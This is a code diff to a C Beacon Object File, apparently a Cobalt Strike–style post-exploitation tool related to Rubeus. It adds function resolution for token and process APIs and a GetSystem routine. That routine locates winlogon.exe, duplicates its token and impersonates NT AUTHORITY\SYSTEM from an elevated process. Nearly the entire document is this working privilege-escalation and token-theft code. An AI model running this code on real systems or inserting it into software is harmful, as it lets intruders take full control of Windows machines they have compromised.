@@ -10,6 +10,7 @@
 
 #include <dsgetdc.h>
 #include <ntsecapi.h>
+#include <tlhelp32.h>
 #include "beacon.h"
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 
@@ -120,6 +121,14 @@ typedef WINADVAPI BOOL (__stdcall* _SystemFunction036)(_Out_writes_bytes_(Random
 typedef WINADVAPI BOOL (WINAPI* _GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
 typedef WINADVAPI BOOL (WINAPI* _OpenThreadToken)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
 typedef WINADVAPI BOOL (WINAPI* _OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
+typedef WINADVAPI BOOL (WINAPI* _DuplicateTokenEx)(HANDLE ExistingTokenHandle, DWORD dwDesiredAccess, LPVOID lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE DuplicateTokenHandle);
+typedef WINADVAPI BOOL (WINAPI* _ImpersonateLoggedOnUser)(HANDLE hToken);
+typedef WINADVAPI BOOL (WINAPI* _RevertToSelf)(void);
+typedef WINBASEAPI HANDLE (WINAPI* _OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
+typedef WINBASEAPI BOOL (WINAPI* _CloseHandle)(HANDLE hObject);
+typedef WINBASEAPI HANDLE (WINAPI* _CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
+typedef WINBASEAPI BOOL (WINAPI* _Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
+typedef WINBASEAPI BOOL (WINAPI* _Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
 typedef WINADVAPI BOOL (WINAPI* _AllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID* pSid);
 typedef WINADVAPI BOOL (WINAPI* _EqualSid)(PSID pSid1, PSID pSid2);
 typedef WINADVAPI PVOID (WINAPI* _FreeSid)(PSID pSid);
@@ -151,6 +160,14 @@ _SystemFunction036        ADVAPI32$SystemFunction036        __attribute__((secti
 _GetTokenInformation      ADVAPI32$GetTokenInformation      __attribute__((section(".data"))) = 0;
 _OpenThreadToken          ADVAPI32$OpenThreadToken          __attribute__((section(".data"))) = 0;
 _OpenProcessToken         ADVAPI32$OpenProcessToken         __attribute__((section(".data"))) = 0;
+_DuplicateTokenEx         ADVAPI32$DuplicateTokenEx         __attribute__((section(".data"))) = 0;
+_ImpersonateLoggedOnUser  ADVAPI32$ImpersonateLoggedOnUser  __attribute__((section(".data"))) = 0;
+_RevertToSelf             ADVAPI32$RevertToSelf             __attribute__((section(".data"))) = 0;
+_OpenProcess              KERNEL32$OpenProcess              __attribute__((section(".data"))) = 0;
+_CloseHandle              KERNEL32$CloseHandle              __attribute__((section(".data"))) = 0;
+_CreateToolhelp32Snapshot KERNEL32$CreateToolhelp32Snapshot __attribute__((section(".data"))) = 0;
+_Process32FirstW          KERNEL32$Process32FirstW          __attribute__((section(".data"))) = 0;
+_Process32NextW           KERNEL32$Process32NextW           __attribute__((section(".data"))) = 0;
 _AllocateAndInitializeSid ADVAPI32$AllocateAndInitializeSid __attribute__((section(".data"))) = 0;
 _EqualSid                 ADVAPI32$EqualSid                 __attribute__((section(".data"))) = 0;
 _FreeSid                  ADVAPI32$FreeSid                  __attribute__((section(".data"))) = 0;
@@ -298,6 +315,15 @@ BOOL LoadFunc() {
     ADVAPI32$OpenProcessToken = GetProcAddress(advapi, "OpenProcessToken");
     if (!ADVAPI32$OpenProcessToken) goto failed;
 
+    ADVAPI32$DuplicateTokenEx = GetProcAddress(advapi, "DuplicateTokenEx");
+    if (!ADVAPI32$DuplicateTokenEx) goto failed;
+
+    ADVAPI32$ImpersonateLoggedOnUser = GetProcAddress(advapi, "ImpersonateLoggedOnUser");
+    if (!ADVAPI32$ImpersonateLoggedOnUser) goto failed;
+
+    ADVAPI32$RevertToSelf = GetProcAddress(advapi, "RevertToSelf");
+    if (!ADVAPI32$RevertToSelf) goto failed;
+
     ADVAPI32$AllocateAndInitializeSid = GetProcAddress(advapi, "AllocateAndInitializeSid");
     if (!ADVAPI32$AllocateAndInitializeSid) goto failed;
 
@@ -351,6 +377,29 @@ BOOL LoadFunc() {
     SECUR32$AcquireCredentialsHandleA = GetProcAddress(secur32, "AcquireCredentialsHandleA");
     if ( !SECUR32$AcquireCredentialsHandleA) goto failed;
 
+    HMODULE k32 = GetModuleHandleA("KERNEL32");
+    if (!k32)
+        k32 = LoadLibraryA("KERNEL32");
+    if (!k32) {
+        PRINT_OUT("[x] Failed to load KERNEL32 module\n");
+        goto failed;
+    }
+
+    KERNEL32$CloseHandle = GetProcAddress(k32, "CloseHandle");
+    if (!KERNEL32$CloseHandle) goto failed;
+
+    KERNEL32$OpenProcess = GetProcAddress(k32, "OpenProcess");
+    if (!KERNEL32$OpenProcess) goto failed;
+
+    KERNEL32$CreateToolhelp32Snapshot = GetProcAddress(k32, "CreateToolhelp32Snapshot");
+    if (!KERNEL32$CreateToolhelp32Snapshot) goto failed;
+
+    KERNEL32$Process32FirstW = GetProcAddress(k32, "Process32FirstW");
+    if (!KERNEL32$Process32FirstW) goto failed;
+
+    KERNEL32$Process32NextW = GetProcAddress(k32, "Process32NextW");
+    if (!KERNEL32$Process32NextW) goto failed;
+
     MEMORY_BANK = KERNEL32$VirtualAlloc(NULL, sizeof(void*) * 0x1000, MEM_COMMIT, PAGE_READWRITE);
     BANK_COUNT = 0;
 
@@ -359,6 +408,97 @@ BOOL LoadFunc() {
 failed:
     return TRUE;
 
+}
+
+// returns true if the current process is running elevated (high integrity / admin)
+BOOL IsHighIntegrity() {
+    HANDLE hToken = NULL;
+    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
+        if (KERNEL32$GetLastError() != ERROR_NO_TOKEN)
+            return FALSE;
+        if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
+            return FALSE;
+    }
+
+    DWORD len = 0;
+    ADVAPI32$GetTokenInformation(hToken, TokenElevation, NULL, 0, &len);
+    if (len == 0) {
+        KERNEL32$CloseHandle(hToken);
+        return FALSE;
+    }
+
+    TOKEN_ELEVATION* elev = (TOKEN_ELEVATION*)MemAlloc(len);
+    BOOL result = FALSE;
+    if (ADVAPI32$GetTokenInformation(hToken, TokenElevation, elev, len, &len))
+        result = elev->TokenIsElevated != 0;
+
+    KERNEL32$CloseHandle(hToken);
+    return result;
+}
+
+// Impersonates NT AUTHORITY\SYSTEM by stealing winlogon's token.
+// Returns TRUE on success (call RevertToSelf afterwards via ADVAPI32$RevertToSelf).
+// Adapted from Rubeus' Helpers.GetSystem().
+BOOL GetSystem() {
+    if (!IsHighIntegrity())
+        return FALSE;
+
+    HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+        return FALSE;
+
+    PROCESSENTRY32W pe;
+    pe.dwSize = sizeof(pe);
+    DWORD winlogonPid = 0;
+
+    if (KERNEL32$Process32FirstW(hSnapshot, &pe)) {
+        do {
+            // match "winlogon.exe"
+            if (pe.szExeFile[0] == L'w' || pe.szExeFile[0] == L'W') {
+                // simple wide-string compare
+                const wchar_t* target = L"winlogon.exe";
+                int i = 0;
+                while (target[i] && (pe.szExeFile[i] == target[i] || pe.szExeFile[i] == target[i] - 32))
+                    i++;
+                if (target[i] == 0 && pe.szExeFile[i] == 0) {
+                    winlogonPid = pe.th32ProcessID;
+                    break;
+                }
+            }
+        } while (KERNEL32$Process32NextW(hSnapshot, &pe));
+    }
+    KERNEL32$CloseHandle(hSnapshot);
+
+    if (winlogonPid == 0)
+        return FALSE;
+
+    // PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+    HANDLE hProcess = KERNEL32$OpenProcess(0x1000, FALSE, winlogonPid);
+    if (!hProcess)
+        return FALSE;
+
+    HANDLE hToken = NULL;
+    // TOKEN_DUPLICATE = 0x0002
+    if (!ADVAPI32$OpenProcessToken(hProcess, 0x0002, &hToken)) {
+        KERNEL32$CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    HANDLE hDupToken = NULL;
+    // SecurityImpersonation = 2, TokenImpersonation = 2
+    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, (SECURITY_IMPERSONATION_LEVEL)2, (TOKEN_TYPE)2, &hDupToken)) {
+        KERNEL32$CloseHandle(hToken);
+        KERNEL32$CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    BOOL ok = ADVAPI32$ImpersonateLoggedOnUser(hDupToken);
+
+    KERNEL32$CloseHandle(hDupToken);
+    KERNEL32$CloseHandle(hToken);
+    KERNEL32$CloseHandle(hProcess);
+
+    return ok;
 }
 
 
